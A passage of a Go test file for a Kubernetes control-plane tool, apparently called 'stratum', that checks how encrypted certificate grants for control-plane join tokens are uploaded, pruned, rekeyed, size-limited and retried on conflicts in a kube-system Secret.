		t.Errorf("get stratum:certs-reader after narrowing nothing: %v, want NotFound", err)
	}
}

func TestJoinTokenHint(t *testing.T) {
	forbidden := fmt.Errorf("get %s secret: %w", certsSecret,
		apierrors.NewForbidden(schema.GroupResource{Resource: "secrets"}, certsSecret, errors.New("no rule")))
	got := joinTokenHint(forbidden)
	if !apierrors.IsForbidden(got) || !strings.Contains(got.Error(), "--control-plane") {
		t.Errorf("joinTokenHint(Forbidden) = %v, want a Forbidden error naming --control-plane", got)
	}
	notFound := apierrors.NewNotFound(schema.GroupResource{Resource: "secrets"}, certsSecret)
	if got := joinTokenHint(notFound); got != notFound {
		t.Errorf("joinTokenHint(NotFound) = %v, want it unchanged", got)
	}
	if got := joinTokenHint(nil); got != nil {
		t.Errorf("joinTokenHint(nil) = %v", got)
	}
}

func leaseRequestAllowed(role *rbacv1.Role, verb, name string) bool {
	for _, rule := range role.Rules {
		if slices.Contains(rule.APIGroups, "coordination.k8s.io") &&
			slices.Contains(rule.Resources, "leases") && slices.Contains(rule.Verbs, verb) &&
			(len(rule.ResourceNames) == 0 || slices.Contains(rule.ResourceNames, name)) {
			return true
		}
	}
	return false
}

func TestPublishedLeaseGrantCanAcquireAbsentMaintenanceLeases(t *testing.T) {
	cs := uploadFixture(t)
	if err := UploadCerts(mustKey(t), tokenOwner("bootstrap-token-abc123", "uid-token-1"), nil); err != nil {
		t.Fatal(err)
	}
	role, err := cs.RbacV1().Roles("kube-system").Get(context.Background(), "stratum:certs-reader", metav1.GetOptions{})
	if err != nil {
		t.Fatal(err)
	}
	joiner := joinerClientset(role, "abc123")
	guard, release, err := maintlease.AcquireCompatible(context.Background(), joiner, "kube-system", "stratum-cluster-maintenance", k8sutil.JoinMaintenanceHolder("abc123"))
	if err != nil {
		t.Fatalf("joining control plane cannot acquire absent maintenance leases: %v", err)
	}
	defer release()
	if err := guard.Confirm(context.Background()); err != nil {
		t.Fatalf("joining control plane cannot renew its maintenance leases: %v", err)
	}
}

func TestExplicitRekeyInvalidatesAllOldGrantCiphertexts(t *testing.T) {
	cs := uploadFixture(t)
	oldKeys := []string{mustKey(t), mustKey(t)}
	for i, id := range []string{"abc123", "def456"} {
		if err := UploadCerts(oldKeys[i], tokenOwner("bootstrap-token-"+id, "uid-"+id), nil); err != nil {
			t.Fatal(err)
		}
	}
	newKey := mustKey(t)
	if err := RekeySharedCerts(newKey, nil); err != nil {
		t.Fatal(err)
	}
	sec := uploadedCertsSecret(t, cs)
	for name, ct := range sec.Data {
		for _, oldKey := range oldKeys {
			if _, err := decrypt(oldKey, ct); err == nil {
				t.Errorf("previous certificate-key still decrypts entry %s after explicit rekey", name)
			}
		}
	}
	if _, err := decrypt(newKey, sec.Data["certs"]); err != nil {
		t.Fatalf("new certificate-key cannot decrypt replacement bundle: %v", err)
	}
}

func TestExplicitRekeyFailureLeavesOldGrantsDecryptable(t *testing.T) {
	cs := uploadFixture(t)
	oldKey := mustKey(t)
	if err := UploadCerts(oldKey, tokenOwner("bootstrap-token-abc123", "uid-abc123"), nil); err != nil {
		t.Fatal(err)
	}
	before := uploadedCertsSecret(t, cs)
	boom := errors.New("replacement Secret update failed")
	cs.PrependReactor("update", "secrets", func(k8stesting.Action) (bool, runtime.Object, error) {
		return true, nil, boom
	})
	if err := RekeySharedCerts(mustKey(t), nil); !errors.Is(err, boom) {
		t.Fatalf("rekey error = %v, want failed replacement update", err)
	}
	after := uploadedCertsSecret(t, cs)
	if !maps.EqualFunc(before.Data, after.Data, bytes.Equal) {
		t.Error("failed rekey changed ciphertexts: grant invalidation and bundle replacement must be atomic")
	}
	if _, err := decryptGrant(after, oldKey, "abc123"); err != nil {
		t.Fatalf("failed rekey invalidated an existing grant: %v", err)
	}
}

func TestUploadCertsDropsTheGrantsOfTokensThatAreGone(t *testing.T) {
	cs := uploadFixture(t)
	ctx := context.Background()
	keyB64 := testEncryptionKey(t)
	config := []byte(testEncryptionConfig(keyB64))
	if err := os.WriteFile(filepath.Join(version.PKIDir, encryptionConfigEntry), config, 0o600); err != nil {
		t.Fatal(err)
	}
	uploaded, err := collectBundle(false)
	if err != nil {
		t.Fatalf("collectBundle: %v", err)
	}
	k1, k2, k3, k4 := mustKey(t), mustKey(t), mustKey(t), mustKey(t)
	if err := UploadCerts(k1, tokenOwner("bootstrap-token-abc123", "uid-token-1"), nil); err != nil {
		t.Fatalf("first mint: %v", err)
	}
	if err := UploadCerts(k2, tokenOwner("bootstrap-token-def456", "uid-token-2"), nil); err != nil {
		t.Fatalf("second mint: %v", err)
	}
	if err := cs.CoreV1().Secrets("kube-system").Delete(ctx, "bootstrap-token-abc123", metav1.DeleteOptions{}); err != nil {
		t.Fatal(err)
	}
	if err := UploadCerts(k3, tokenOwner("bootstrap-token-ghi789", "uid-token-3"), nil); err != nil {
		t.Fatalf("third mint: %v", err)
	}
	sec := uploadedCertsSecret(t, cs)
	if _, ok := sec.Data[grantEntryName("abc123")]; ok {
		t.Error("the mint kept the grant entry of a token that is gone: with no operator to prune it, every expired join command keeps a bundle-sized entry until the Secret is full")
	}
	grantDecrypts(t, sec, grantEntryName("def456"), k2, uploaded)
	grantDecrypts(t, sec, grantEntryName("ghi789"), k3, uploaded)
	uploadedFilesMatch(t, decryptedFlatMap(t, sec, "certs", k3), uploaded)
	raw, err := atRestKeyFromEncryptionConfig(config)
	if err != nil {
		t.Fatal(err)
	}
	if proof, ok := sec.Data[encryptionKeyProofEntry]; !ok || !atRestKeyProofOpens(proof, raw) {
		t.Errorf("the at-rest-key proof is gone or no longer opens after the mint pruned (present=%v): it is not a grant entry", ok)
	}
	if len(sec.OwnerReferences) != 3 {
		t.Errorf("owner references = %v, want all three kept: pruning drops data entries, and garbage collection settles the owners", sec.OwnerReferences)
	}

	cs.PrependReactor("get", "secrets", func(action k8stesting.Action) (bool, runtime.Object, error) {
		if action.(k8stesting.GetAction).GetName() == "bootstrap-token-def456" {
			return true, nil, apierrors.NewInternalError(errors.New("etcdserver: request timed out"))
		}
		return false, nil, nil
	})
	if err := UploadCerts(k4, tokenOwner("bootstrap-token-jkl012", "uid-token-4"), nil); err != nil {
		t.Fatalf("a mint while one token cannot be read: %v", err)
	}
	sec = uploadedCertsSecret(t, cs)
	grantDecrypts(t, sec, grantEntryName("def456"), k2, uploaded)
	grantDecrypts(t, sec, grantEntryName("jkl012"), k4, uploaded)
}

func TestUploadCertsRefusesAMintTheSecretCannotHold(t *testing.T) {
	cs := uploadFixture(t)
	ctx := context.Background()
	tooLong := 0
	cs.PrependReactor("*", "secrets", func(action k8stesting.Action) (bool, runtime.Object, error) {
		var written *corev1.Secret
		switch a := action.(type) {
		case k8stesting.CreateAction:
			written, _ = a.GetObject().(*corev1.Secret)
		case k8stesting.UpdateAction:
			written, _ = a.GetObject().(*corev1.Secret)
		}
		if written == nil {
			return false, nil, nil
		}
		size := 0
		for _, v := range written.Data {
			size += len(v)
		}
		if size > corev1.MaxSecretSize {
			tooLong++
			return true, nil, apierrors.NewInvalid(schema.GroupKind{Kind: "Secret"}, written.Name,
				field.ErrorList{field.TooLong(field.NewPath("data"), "", corev1.MaxSecretSize)})
		}
		return false, nil, nil
	})
	tokenID := func(i int) string { return fmt.Sprintf("t%05d", i) }
	minted := 0
	var refused error
	var before *corev1.Secret
	for i := range 64 {
		if minted > 0 {
			before = uploadedCertsSecret(t, cs)
		}
		id := tokenID(i)
		if err := UploadCerts(mustKey(t), tokenOwner("bootstrap-token-"+id, "uid-"+id), nil); err != nil {
			refused = err
			break
		}
		minted++
	}
	if refused == nil {
		t.Fatalf("%d live grants fit in stratum-certs and the next mint was still accepted: no refusal before the apiserver's limit", minted)
	}
	if before == nil {
		t.Fatalf("the first mint was refused: %v", refused)
	}
	if tooLong != 0 {
		t.Errorf("the apiserver rejected %d writes as too long: the mint must refuse, naming the remedy, before it sends one", tooLong)
	}
	for _, want := range []string{
		fmt.Sprintf("%d control-plane join grants", minted),
		tokenID(0) + ", " + tokenID(1),
		"stratum token list",
		"kubectl -n kube-system delete secret bootstrap-token-",
	} {
		if !strings.Contains(refused.Error(), want) {
			t.Errorf("the refusal does not say %q: %v", want, refused)
		}
	}
	after := uploadedCertsSecret(t, cs)
	if !maps.EqualFunc(before.Data, after.Data, bytes.Equal) || len(after.OwnerReferences) != len(before.OwnerReferences) {
		t.Error("the refused mint changed stratum-certs: a refusal must publish nothing")
	}

	for i := range 3 {
		if err := cs.CoreV1().Secrets("kube-system").Delete(ctx, "bootstrap-token-"+tokenID(i), metav1.DeleteOptions{}); err != nil {
			t.Fatal(err)
		}
	}
	if err := UploadCerts(mustKey(t), tokenOwner("bootstrap-token-x00001", "uid-x00001"), nil); err != nil {
		t.Fatalf("a mint after deleting three join tokens = %v, want it to fit", err)
	}
	sec := uploadedCertsSecret(t, cs)
	for i := range 3 {
		if _, ok := sec.Data[grantEntryName(tokenID(i))]; ok {
			t.Errorf("the deleted token %s still has a grant entry", tokenID(i))
		}
	}
}

func versionedCertsSecret(t *testing.T, cs *fake.Clientset, rv string, concurrent func(call int, stored *corev1.Secret) bool) *[]string {
	t.Helper()
	gvr := corev1.SchemeGroupVersion.WithResource("secrets")
	obj, err := cs.Tracker().Get(gvr, "kube-system", certsSecret)
	if err != nil {
		t.Fatal(err)
	}
	seed := obj.(*corev1.Secret).DeepCopy()
	seed.ResourceVersion = rv
	if err := cs.Tracker().Update(gvr, seed, "kube-system"); err != nil {
		t.Fatal(err)
	}
	next := func(v string) string {
		n, _ := strconv.Atoi(v)
		return strconv.Itoa(n + 1)
	}
	carried := []string{}
	cs.PrependReactor("update", "secrets", func(action k8stesting.Action) (bool, runtime.Object, error) {
		sec, ok := action.(k8stesting.UpdateAction).GetObject().(*corev1.Secret)
		if !ok || sec.Name != certsSecret {
			return false, nil, nil
		}
		carried = append(carried, sec.ResourceVersion)
		obj, err := cs.Tracker().Get(gvr, "kube-system", certsSecret)
		if err != nil {
			return true, nil, err
		}
		stored := obj.(*corev1.Secret).DeepCopy()
		if concurrent != nil && concurrent(len(carried), stored) {
			stored.ResourceVersion = next(stored.ResourceVersion)
			if err := cs.Tracker().Update(gvr, stored, "kube-system"); err != nil {
				return true, nil, err
			}
		}
		if sec.ResourceVersion != "" && sec.ResourceVersion != stored.ResourceVersion {
			return true, nil, apierrors.NewConflict(corev1.Resource("secrets"), certsSecret,
				errors.New("the object has been modified; please apply your changes to the latest version and try again"))
		}
		out := sec.DeepCopy()
		out.ResourceVersion = next(stored.ResourceVersion)
		if err := cs.Tracker().Update(gvr, out, "kube-system"); err != nil {
			return true, nil, err
		}
		return true, out, nil
	})
	return &carried
}

func TestUploadCertsRetriesAConflictingSecretUpdate(t *testing.T) {
	gvr := corev1.SchemeGroupVersion.WithResource("secrets")
	setup := func(t *testing.T) (cs *fake.Clientset, k1, k2 string, uploaded map[string][]byte, carried *[]string) {
		cs = uploadFixture(t)
		k1, k2 = mustKey(t), mustKey(t)
		if err := UploadCerts(k1, tokenOwner("bootstrap-token-abc123", "uid-token-1"), nil); err != nil {
			t.Fatalf("first mint: %v", err)
		}
		uploaded, err := collectBundle(false)
		if err != nil {
			t.Fatalf("collectBundle: %v", err)
		}
		tok := &corev1.Secret{ObjectMeta: metav1.ObjectMeta{Name: "bootstrap-token-def456", Namespace: "kube-system"}}
		if err := cs.Tracker().Create(gvr, tok, "kube-system"); err != nil {
			t.Fatal(err)
		}
		env := envelopeShape{Version: 1, Files: uploaded}
		env.Metadata.Generation = 2
		env.Metadata.EtcdEndpoints = []string{"10.0.0.11"}
		concurrentGrant := sealedEnvelope(t, k2, env)
		carried = versionedCertsSecret(t, cs, "7", func(call int, stored *corev1.Secret) bool {
			if call != 1 {
				return false
			}
			stored.Data[grantEntryName("def456")] = concurrentGrant
			stored.OwnerReferences = append(stored.OwnerReferences, *tokenOwner("bootstrap-token-def456", "uid-token-2"))
			return true
		})
		return cs, k1, k2, uploaded, carried
	}

	t.Run("the retry keeps the grant that landed first", func(t *testing.T) {
		cs, k1, k2, uploaded, carried := setup(t)
		k3 := mustKey(t)
		if err := UploadCerts(k3, tokenOwner("bootstrap-token-ghi789", "uid-token-3"), nil); err != nil {
			t.Fatalf("the mint that met a conflict: %v", err)
		}
		sec := uploadedCertsSecret(t, cs)
		grantDecrypts(t, sec, grantEntryName("abc123"), k1, uploaded)
		grantDecrypts(t, sec, grantEntryName("def456"), k2, uploaded)
		grantDecrypts(t, sec, grantEntryName("ghi789"), k3, uploaded)
		uploadedFilesMatch(t, decryptedFlatMap(t, sec, "certs", k3), uploaded)
		owners := map[types.UID]bool{}
		for _, r := range sec.OwnerReferences {
			owners[r.UID] = true
		}
		for _, uid := range []types.UID{"uid-token-1", "uid-token-2", "uid-token-3"} {
			if !owners[uid] {
				t.Errorf("owner reference %s is missing after the retried mint: %v", uid, sec.OwnerReferences)
			}
		}
		if want := []string{"7", "8"}; !slices.Equal(*carried, want) {
			t.Errorf("the updates carried resourceVersions %q, want %q: the version read, then the re-read one after the conflict", *carried, want)
		}
	})

	t.Run("the store catches a write that drops the version it read", func(t *testing.T) {
		cs, _, _, _, _ := setup(t)
		ctx := context.Background()
		secrets := cs.CoreV1().Secrets("kube-system")
		cur, err := secrets.Get(ctx, certsSecret, metav1.GetOptions{})
		if err != nil {
			t.Fatal(err)
		}
		cur.ResourceVersion = ""
		cur.Data[grantEntryName("ghi789")] = []byte("a blind writer's grant")
		if _, err := secrets.Update(ctx, cur, metav1.UpdateOptions{}); err != nil {
			t.Fatalf("the blind write: %v", err)
		}
		if _, ok := uploadedCertsSecret(t, cs).Data[grantEntryName("def456")]; ok {
			t.Fatal("the concurrent grant survived a write that carried no resourceVersion: the versioned store cannot tell a blind write from a compare-and-swap")
		}
	})
}

func TestUploadCertsRefusesTheSecretWriteAfterLosingTheLease(t *testing.T) {
	cs := uploadFixture(t)
	var errMaintenanceLost = errors.New("maintenance lease lost")
	confirm := func(context.Context) error { return errMaintenanceLost }
	if err := UploadCerts(mustKey(t), tokenOwner("bootstrap-token-abc123", "uid-token-1"), confirm); !errors.Is(err, errMaintenanceLost) {
		t.Fatalf("UploadCerts = %v, want the lost-lease refusal at the Secret write", err)
	}
	if _, err := cs.CoreV1().Secrets("kube-system").Get(context.Background(), certsSecret, metav1.GetOptions{}); !apierrors.IsNotFound(err) {
		t.Fatalf("stratum-certs after the refusal: %v; the refused publication must not write the Secret", err)
	}
	if _, err := cs.RbacV1().Roles("kube-system").Get(context.Background(), "stratum:certs-reader", metav1.GetOptions{}); err != nil {
		t.Errorf("the stratum:certs-reader Role did not exist after the refusal: %v", err)
	}
}

func TestUploadCertsNamesTheUploadersProfile(t *testing.T) {
	cs := uploadFixture(t)
	old := recordedProfile
	t.Cleanup(func() { recordedProfile = old })
	for _, tc := range []struct {
		name string
		prof *string
	}{
		{"cis", ptrTo("cis")},
		{"no profile", ptrTo("")},
		{"unreadable node state", nil},
	} {
		t.Run(tc.name, func(t *testing.T) {
			recordedProfile = func() *string { return tc.prof }
			key := mustKey(t)
			if err := UploadCerts(key, tokenOwner("bootstrap-token-abc123", "uid-token-1"), nil); err != nil {
				t.Fatal(err)
			}
			got := decryptedEnvelope(t, uploadedCertsSecret(t, cs), grantEntryName("abc123"), key).Metadata.Profile
			if (got == nil) != (tc.prof == nil) || (got != nil && *got != *tc.prof) {
				t.Fatalf("envelope profile = %v, want %v", got, tc.prof)
			}
		})
	}
}

func ptrTo(s string) *string { return &s }

func TestCollectBundleCarriesTheProfilesSharedSecrets(t *testing.T) {
	uploadFixture(t)
	files, err := collectBundle(false)
	if err != nil {
		t.Fatal(err)
	}
	if _, ok := files[encryptionConfigEntry]; ok {
		t.Fatalf("the bundle carries %s, which this control plane does not hold", encryptionConfigEntry)
	}
	key := filepath.Join(version.PKIDir, encryptionConfigEntry)
	if err := os.WriteFile(key, []byte("the key"), 0o600); err != nil {
		t.Fatal(err)
	}
	if files, err = collectBundle(false); err != nil || string(files[encryptionConfigEntry]) != "the key" {
		t.Fatalf("collectBundle = %q, %v; want the key", files[encryptionConfigEntry], err)
	}
	if os.Geteuid() == 0 {
		t.Skip("root reads a 0000 file")
	}
	if err := os.Chmod(key, 0o000); err != nil {
		t.Fatal(err)
	}
	if _, err := collectBundle(false); err == nil || !strings.Contains(err.Error(), encryptionConfigEntry) {
		t.Fatalf("collectBundle over an unreadable secret = %v, want an error naming it", err)
	}
}
